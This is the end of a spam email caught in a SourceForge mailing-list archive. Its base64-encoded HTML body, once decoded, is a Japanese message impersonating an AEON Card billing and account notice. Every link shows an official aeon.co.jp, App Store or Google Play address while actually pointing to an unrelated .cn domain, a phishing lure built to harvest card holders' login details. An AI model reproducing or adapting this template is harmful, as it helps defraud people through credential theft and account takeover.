aHR0cHM6Ly91OWRlai5jbiI+aHR0cHM6Ly93d3cuYWVvbi5jby5qcC9hcHAvcmV2by88L0E+PC9Q
Pg0KPFA+5Y+j5bqn5q6L6auY44Gu44GU56K66KqN44O744GU5YWl6YeR44Gv44CB44GK5pSv5omV
5pel44Gu5YmN5Za25qWt5pel44G+44Gn44Gr44GK6aGY44GE44GE44Gf44GX44G+44GZ44CCPEJS
PuOBlOWIqeeUqOaYjue0sOOBr+OAgeOCouODl+ODquOAjOOCpOOCquODs+OCpuOCqeODrOODg+OD
iOOAjeOBvuOBn+OBr+ODm+ODvOODoOODmuODvOOCuOOAjOaaruOCieOBl+OBruODnuODjeODvOOC
teOCpOODiOOAjeOBuOODreOCsOOCpOODs+OBhOOBn+OBoOOBjeOBlOeiuuiqjeOBj+OBoOOBleOB
hOOAgjwvUD4NCjxQPuKWvOaaruOCieOBl+OBruODnuODjeODvOOCteOCpOODiOOBr+OBk+OBoeOC
iTxCUj48QSANCmhyZWY9Imh0dHBzOi8vdTlkZWouY24iPmh0dHBzOi8vd3d3LmFlb24uY28uanAv
YXBwLzwvQT48L1A+DQo8UD7igLsxNeaXpeaZgueCueOBp+OBruiri+axgueiuuWumumhjeOBq+OB
quOCiuOBvuOBmeOAgjE1772eMjDml6XjgavjgZToq4vmsYLpoY3jgpLlpInmm7TjgZXjgozjgZ/l
oLTlkIjjga/jgIEyM+aXpeS7pemZjeOBq+OBlOiri+axgumhjeOBjOeiuuWumuOBl+OBvuOBmeOA
guWGjeW6puiri+axgumhjeeiuuWumuODoeODvOODq+OCkuOBiumAgeOCiuOBhOOBn+OBl+OBvuOB
meOAgjxCUj7igLsyMeaXpeS7pemZjeOBq+OBlOiri+axgumhjeOBruWkieabtOOCkuOBleOCjOOB
n+WgtOWQiOOAgeacgOe1gueahOOBquOBlOiri+axgumhjeOBr+aciOacq+OBq+aaruOCieOBl+OB
ruODnuODjeODvOOCteOCpOODiOOCiOOCiuOBlOeiuuiqjeOBj+OBoOOBleOBhOOAgjxCUj7igLvj
gYrlvJXokL3lj6Pluqfjga7oqK3lrprjgYzlrozkuobjgZfjgabjgYTjgarjgYTloLTlkIjjga/j
gIHmnIjmnKvpoIPjgavnmbrpgIHjgYTjgZ/jgZfjgb7jgZnjgrPjg7Pjg5Pjg4vjga7mjK/ovrzn
lKjntJnjgafjga7jgYrmlK/miZXjgYTjgpLjgYrpoZjjgYTjgYTjgZ/jgZfjgb7jgZnjgILjgYrl
vJXokL3lj6Pluqfjga7oqK3lrprjgYzlrozkuobjgZfjgZ/jgYvjgZTkuI3mmI7jgarloLTlkIjj
ga/kuIvoqJjjgojjgorjgZTnorroqo3jgY/jgaDjgZXjgYTjgII8QlI+PEEgDQpocmVmPSJodHRw
czovL3U5ZGVqLmNuIj5odHRwczovL2ZhcS5hZW9uLmNvLmpwL2ZhcS9zaG93LzY2MD9zaXRlX2Rv
bWFpbj1kZWZhdWx0PC9BPjxCUj7igLvkuIDpg6jjgIHjgYrlvJXokL3ml6XjgYznlbDjgarjgovj
gqvjg7zjg4njgYzjgZTjgZbjgYTjgb7jgZnjgII8QlI+4oC744Oq44Oc5omV44GE44Gv44CB5YmN
5pyIMTHml6XvvZ7ku4rmnIgxMOaXpeOBvuOBp+OBruOCt+ODp+ODg+ODlOODs+OCsOOBlOWIqeeU
qOWIhuOBrjHlm57miZXjgYTjgajjg5zjg7zjg4rjgrnkuIDmi6zmiZXjgYTjgpLjg6rjg5zmiZXj
gYTjgbjlpInmm7TjgYTjgZ/jgaDjgZHjgb7jgZnjgII8QlI+4oC75piO57Sw5oyH5a6a44Oq44Oc
44Gv44GU5Yip55So5piO57SwMeS7tuOBlOOBqOOBq+ODquODnOaJleOBhOOBuOWkieabtOOBhOOB
n+OBoOOBkeOBvuOBmeOAgjwvUD4NCjxQPuKWvOePvuWcqOOBruOBlOWIqeeUqOWPr+iDvemhjeOB
ruOBlOeiuuiqjeODu+OBlOWIqeeUqOWPr+iDveaeoOOBruWkieabtOOBr+OAgeS7peS4i+OCiOOC
iuOBiuaJi+e2muOBjeOBj+OBoOOBleOBhOOAgjxCUj48QSANCmhyZWY9Imh0dHBzOi8vdTlkZWou
Y24iPmh0dHBzOi8vd3d3LmFlb24uY28uanAvYXBwL3NldHRpbmdzL2xpbWl0LzwvQT48L1A+DQo8
UD7ilIHilIHilIHilIHilIHilIHilIHilIE8QlI+V0FPTiBQT0lOVOOBq+OBpOOBhOOBpjxCUj7i
lIHilIHilIHilIHilIHilIHilIHilIE8QlI+44Kv44Os44K444OD44OI44O744OH44OT44OD44OI
5omV44GE44Gn44Gf44G+44KLV0FPTiANClBPSU5U5pWw44Gv5q+O5pyIMjXml6Xjgavjg4fjg7zj
gr/jgYzmm7TmlrDjgZXjgozjgb7jgZnjgILjgqLjg5fjg6rjgIzjgqTjgqrjg7Pjgqbjgqnjg6zj
g4Pjg4jjgI3jgb7jgZ/jga/jg5vjg7zjg6Djg5rjg7zjgrjjgIzmmq7jgonjgZfjga7jg57jg43j
g7zjgrXjgqTjg4jjgI3jgbjjg63jgrDjgqTjg7PjgYTjgZ/jgaDjgY3jgZTnorroqo3jgY/jgaDj
gZXjgYTjgII8QlI+KFdBT04gDQpQT0lOVOOBjOmAsuWRiOOBleOCjOOBquOBhOOCq+ODvOODieOB
r+OBlOWIqeeUqOOBhOOBn+OBoOOBkeOBvuOBm+OCkyk8L1A+DQo8UD7ilrzmmq7jgonjgZfjga7j
g57jg43jg7zjgrXjgqTjg4jjga/jgZPjgaHjgok8QlI+PEEgDQpocmVmPSJodHRwczovL3U5ZGVq
LmNuIj5odHRwczovL3d3dy5hZW9uLmNvLmpwL2FwcC9wb2ludC88L0E+PEJSPuKWvFdBT04gDQpQ
T0lOVOOBruS9v+OBiOOCi+W6l+iIl+ODu+S9v+OBhOaWueOBq+mWouOBl+OBpuOBr+OBk+OBoeOC
iTxCUj48QSANCmhyZWY9Imh0dHBzOi8vdTlkZWouY24iPmh0dHBzOi8vZmFxLmFlb24uY28uanAv
ZmFxL3Nob3cvNTYyP2JhY2s9ZnJvbnQlMkZjYXRlZ29yeSUzQXNob3cmYW1wO2NhdGVnb3J5X2lk
PTE2NiZhbXA7cGFnZT0xJmFtcDtzaXRlX2RvbWFpbj1kZWZhdWx0JmFtcDtzb3J0PXNvcnRfYWNj
ZXNzJmFtcDtzb3J0X29yZGVyPWRlc2M8L0E+PC9QPg0KPFA+4pSB4pSB4pSB4pSB4pSB4pSB4pSB
4pSBPEJSPuOCouODl+ODquOChOODoeODvOODq+OBp+OBiuODiOOCr+OBquaDheWgseOBjOWPl+WP
luOCjOOBvuOBme+8gTxCUj7ilIHilIHilIHilIHilIHilIHilIHilIE8QlI+44Kk44Kq44Oz44Kr
44O844OJ5YWs5byP44Ki44OX44Oq44CM44Kk44Kq44Oz44Km44Kp44Os44OD44OI44CN44Gq44KJ
44GU5Yip55So5piO57Sw44Gu56K66KqN44KE44Od44Kk44Oz44OI5Lqk5o+b44Gv44KC44Gh44KN
44KT44CB5Lya5ZOh6ZmQ5a6a44Kv44O844Od44Oz44KC5Yip55So44Gn44GN5L6/5Yip44Gn44GK
44OI44Kv4pmqPEJSPuKWvGlQaG9uZeOCkuOBiuaMgeOBoeOBruaWueOBr+OBk+OBoeOCiTxCUj48
QSANCmhyZWY9Imh0dHBzOi8vdTlkZWouY24iPmh0dHBzOi8vaXR1bmVzLmFwcGxlLmNvbS9qcC9h
cHAvYWVvbi13YWxsZXQvaWQxMTAwNTY0ODQyP2w9amEmYW1wO2xzPTEmYW1wO210PTg8L0E+PEJS
PuKWvEFuZHJvaWTjgrnjg57jg5vjgpLjgYrmjIHjgaHjga7mlrnjga/jgZPjgaHjgok8QlI+PEEg
DQpocmVmPSJodHRwczovL3U5ZGVqLmNuIj5odHRwczovL3BsYXkuZ29vZ2xlLmNvbS9zdG9yZS9h
cHBzL2RldGFpbHM/aWQ9anAuY28uYWVvbi5jcmVkaXQuYW5kcm9pZC53YWxsZXQ8L0E+PC9QPg0K
PFA+4pa844Kk44Kq44Oz44Gq44Gp44Gn44Gu44GK6LK344GE54mp5oOF5aCx44KE44Kr44O844OJ
44Kt44Oj44Oz44Oa44O844Oz5oOF5aCx44KC44GE44Gh5pep44GP44GK5bGK44GR77yB44Oh44O8
44Or44Oe44Ks44K444Oz44Gu44GU55m76Yyy44Gv44GT44Gh44KJPEJSPjxBIA0KaHJlZj0iaHR0
cHM6Ly91OWRlai5jbiI+aHR0cHM6Ly93d3cuYWVvbi5jby5qcC9zZXJ2aWNlL25ld3NsZXR0ZXIv
PC9BPjwvUD4NCjxQPuKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgTxCUj7jgZToq4vmsYLmmI7ntLDm
m7jjga7pg7XpgIHjgavjgaTjgYTjgaY8QlI+4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBPEJSPuOB
lOiri+axguaYjue0sOabuOOBrumDtemAgeOCkuW4jOacm+OBleOCjOOCi+WgtOWQiOOAgeaaruOC
ieOBl+OBruODnuODjeODvOOCteOCpOODiOOCiOOCiuOBiuaJi+e2muOBjeOBj+OBoOOBleOBhOOA
guOBquOBiuOAgeOAjOOBlOiri+axguaYjue0sOabuOeZuuihjOaJi+aVsOaWmeOAjeOBqOOBl+OB
pjHpgJrjgYLjgZ/jgooxMTDlhoYo56iO6L68KeOCkuOBlOiyoOaLheOBhOOBn+OBoOOBjeOBvuOB
meOAgjxCUj7mr47mnIgxMOaXpeOBvuOBp+OBrueZu+mMsuOBp+e/jOaciOOBruOBlOiri+axguWI
huOCiOOCiumDtemAgeOBhOOBn+OBl+OBvuOBmeOAgjwvUD4NCjxQPuKWvOOBiuaJi+e2muOBjeOB
r+OBk+OBoeOCiTxCUj7igLvoq4vmsYLpoY3norrlrprjg6Hjg7zjg6vjgbjjga7jgZToq4vmsYLp
oY3ooajnpLrjga7pnZ7ooajnpLroqK3lrprjgoLjgZPjgaHjgonjgYvjgonlpInmm7TjgafjgY3j
gb7jgZnjgII8QlI+PEEgDQpocmVmPSJodHRwczovL3U5ZGVqLmNuIj5odHRwczovL3d3dy5hZW9u
LmNvLmpwL2FwcC9zZXR0aW5ncy9kZXRhaWxzLzwvQT48L1A+DQo8UD7ilIHilIHilIHilIHilIHi
lIHilIHilIE8QlI+44GK5a6i44GV44G+5oOF5aCx44Gu5pyA5paw5YyW44Gr44Gk44GE44GmPEJS
PuKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgTxCUj7jgZTnmbvpjLLmg4XloLEo5rCP5ZCN44CB5L2P
5omA44CB6YCj57Wh5YWI44CB44Oh44O844Or44Ki44OJ44Os44K544Gq44GpKeOBq+WkieabtOOB
jOOBlOOBluOBhOOBvuOBl+OBn+OCieOAgeaaruOCieOBl+OBruODnuODjeODvOOCteOCpOODiOOC
iOOCiuOBiuaJi+e2muOBjeOCkuOBiumhmOOBhOOBhOOBn+OBl+OBvuOBmeOAgjwvUD4NCjxQPuKJ
quS9j+aJgOWkieabtOaJi+e2muOBjeOBruOBiumhmOOBhOKJqzxCUj7jgYrlvJXotorjgZfjgarj
ganjgafkvY/miYDjgavlpInmm7TjgYznlJ/jgZjjgZ/pmpvjgavjga/jgIHjgYrml6njgoHjgavk
vY/miYDlpInmm7Tjga7lsYrlh7rjgpLjgYrpoZjjgYTjgYTjgZ/jgZfjgb7jgZnjgILjgYrlsYrj
gZHjgYTjgZ/jgaDjgZHjgarjgYTloLTlkIjjgIHpg7XpgIHjgavjgojjgovph43opoHjgarjgYrn
n6XjgonjgZvjgYzlsYrjgYvjgarjgYTloLTlkIjjgoLjgYLjgorjgb7jgZnjga7jgafjgZTms6jm
hI/jgY/jgaDjgZXjgYTjgII8L1A+DQo8UD7ilrzjgqvjg7zjg4nnmbvpjLLlhoXlrrnnhafkvJrj
g7vlpInmm7TjgavjgaTjgYTjgabjga/jgZPjgaHjgok8QlI+PEEgDQpocmVmPSJodHRwczovL3U5
ZGVqLmNuIj5odHRwczovL3d3dy5hZW9uLmNvLmpwL2lucXVpcnkvY2hhbmdlLzwvQT48L1A+DQo8
UD7ilrzjg6Hjg7zjg6vjgqLjg4njg6zjgrnjga7lpInmm7Tjga/jgZPjgaHjgok8QlI+PEEgDQpo
cmVmPSJodHRwczovL3U5ZGVqLmNuIj5odHRwczovL3d3dy5hZW9uLmNvLmpwL2FwcC9zZXR0aW5n
cy9wcm9maWxlLzwvQT48L1A+DQo8UD7vvJ3vvJ3vvJ3vvJ3vvJ3vvJ3vvJ3vvJ3vvJ08QlI+4pag
44Kk44Kq44Oz44K544Kv44Ko44Ki44Oh44Oz44OQ44O8SUTjg7vjg5Hjgrnjg6/jg7zjg4njgpLj
gYrlv5jjgozjga7loLTlkIg8QlI+PEEgDQpocmVmPSJodHRwczovL3U5ZGVqLmNuIj5odHRwczov
L3d3dy5hZW9uLmNvLmpwL2FwcC9zZWFyY2hfaWRfcHdfcmVpc3N1ZS88L0E+PC9QPg0KPFA+4pag
44KI44GP44GC44KL44GU6LOq5ZWPPEJSPjxBIA0KaHJlZj0iaHR0cHM6Ly91OWRlai5jbiI+aHR0
cHM6Ly9mYXEuYWVvbi5jby5qcC8/c2l0ZV9kb21haW49ZGVmYXVsdDwvQT48L1A+DQo8UD7ilqDj
gYrllY/jgYTlkIjjgo/jgZvlhYg8QlI+PEEgDQpocmVmPSJodHRwczovL3U5ZGVqLmNuIj5odHRw
czovL3d3dy5hZW9uLmNvLmpwL2lucXVpcnkvPC9BPjwvUD4NCjxQPuKWoOOCueODnuODvOODiOOD
leOCqeODs+OBruaWueOBr+OBk+OBoeOCieOCkuOBlOWIqeeUqOOBj+OBoOOBleOBhOOAguOBiuWb
sOOCiuOBlOOBqOOBruino+axuuaWueazleOCkuOBlOahiOWGheOBhOOBn+OBl+OBvuOBmeOAgjxC
Uj5b44Kk44Kq44Oz44Kr44O844OJ44Gr44Gk44GE44GmXTxCUj48QSANCmhyZWY9Imh0dHBzOi8v
dTlkZWouY24iPmh0dHBzOi8vd3d3LmFlb24uY28uanAvdi1pdnIvPC9BPjxCUj5b44Kk44Kq44Oz
6YqA6KGM44Gr44Gk44GE44GmXTxCUj48QSANCmhyZWY9Imh0dHBzOi8vdTlkZWouY24iPmh0dHBz
Oi8vdml2ci5hZW9uYmFuay5jby5qcC88L0E+PC9QPg0KPFA+4pag44K744Kt44Ol44Oq44OG44Kj
44Gr44Gk44GE44GmKOWuieW/g+ODu+WuieWFqOOBquapn+iDveOAgeOCguOBl+OCguOBruOBqOOB
jeOBruOCteODvOODk+OCuSk8QlI+PEEgDQpocmVmPSJodHRwczovL3U5ZGVqLmNuIj5odHRwczov
L3d3dy5hZW9uLmNvLmpwL3NlY3VyaXR5LzwvQT48L1A+DQo8UD7vvJ3vvJ3vvJ3vvJ3vvJ3vvJ3v
vJ3vvJ3vvJ08QlI+44GT44Gu44Oh44O844Or44Ki44OJ44Os44K5WyANCjxBPnN0YXRlbWVudEBl
bWFpbC5hZW9uLmNvLmpwPC9BPl3jga/pgIHkv6HlsILnlKjjgqLjg4njg6zjgrnjga7jgZ/jgoHj
gIHjgZTov5Tkv6HjgYTjgZ/jgaDjgYTjgabjgoLjgZTnlKjku7bjga/mib/jgozjgb7jgZvjgpPj
gII8QlI+5b2T44Oh44O844Or44Gr44GK5b+D5b2T44Gf44KK44Gu44Gq44GE5pa544Gv44CB5aSn
5aSJ44GK5omL5pWw44KS44GK5o6b44GR44GE44Gf44GX44G+44GZ44GM44CB44Gd44Gu5peo44KS
44GK5pu444GN5re744GI44GE44Gf44Gg44GN5LiL6KiY44Ki44OJ44Os44K544G+44Gn44GK6YCB
44KK44GP44Gg44GV44GE44CCPEJSPjxBPm5ldGJyYW5jaEBhZW9uLmNvLmpwPC9BPjwvUD4NCjxQ
PuKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgTxCUj7nmbrooYzvvJrmoKrlvI/kvJrnpL7jgqTj
gqrjg7PpioDooYw8QlI+PEEgDQpocmVmPSJodHRwczovL3U5ZGVqLmNuIj5odHRwczovL3d3dy5h
ZW9uYmFuay5jby5qcC88L0E+PC9QPg0KPFA+5qWt5YuZ5Y+X6KiX5Lya56S+77ya44Kk44Kq44Oz
44OV44Kj44OK44Oz44K344Oj44Or44K144O844OT44K55qCq5byP5Lya56S+PEJSPjxBIA0KaHJl
Zj0iaHR0cHM6Ly91OWRlai5jbiI+aHR0cHM6Ly93d3cuYWVvbmZpbmFuY2lhbC5jby5qcC88L0E+
PC9QPg0KPFA+44GT44Gu44Oh44O844Or44Gr5o6y6LyJ44GV44KM44Gf5YaF5a6544KS6Kix5Y+v
44Gq44GP6Lui6LyJ44GZ44KL44GT44Go44KS56aB44GY44G+44GZ44CCPEJSPuKUgeKUgeKUgeKU
geKUgeKUgeKUgeKUgeKUgTxCUj48L1A+PC9CT0RZPjwvSFRNTD4NCg==

------=_NextPart_000_0A89_0137E83B.1118CD90--



--===============6827186438748222235==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============6827186438748222235==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============6827186438748222235==--


